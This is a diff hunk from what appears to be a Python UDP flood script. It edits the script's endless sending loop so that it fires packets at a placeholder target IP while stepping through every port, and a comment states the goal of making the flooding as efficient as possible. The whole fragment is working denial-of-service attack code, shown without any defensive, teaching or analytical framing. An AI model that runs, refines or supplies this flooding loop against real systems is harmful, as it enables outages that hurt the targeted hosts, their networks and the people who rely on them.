@@ -15,40 +15,32 @@ port = <"SET_PORT">
 sent = 0 
 
 while True:
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
-  socket.sendto(data, (ip,int(port)))
+  socket.sendto(data, (ip,int(port))) # spamming this two lines might be minor, but want to make it a efficent as possible
+  port += 1
   socket.sendto(data, (ip,int(port)))
   port += 1
+  socket.sendto(data, (ip,int(port)))
+  port += 1
+  socket.sendto(data, (ip,int(port)))
+  port += 1
+  socket.sendto(data, (ip,int(port)))
+  port += 1
+  socket.sendto(data, (ip,int(port)))
+  port += 1
+  socket.sendto(data, (ip,int(port)))
+  port += 1
+  socket.sendto(data, (ip,int(port)))
+  port += 1
+  socket.sendto(data, (ip,int(port)))
+  port += 1
+  socket.sendto(data, (ip,int(port)))
+  port += 1
+  socket.sendto(data, (ip,int(port)))
+  port += 1
+  socket.sendto(data, (ip,int(port)))
+  port += 1
+  socket.sendto(data, (ip,int(port)))
+  port += 1
+
   if port == 65534:
     port = 1
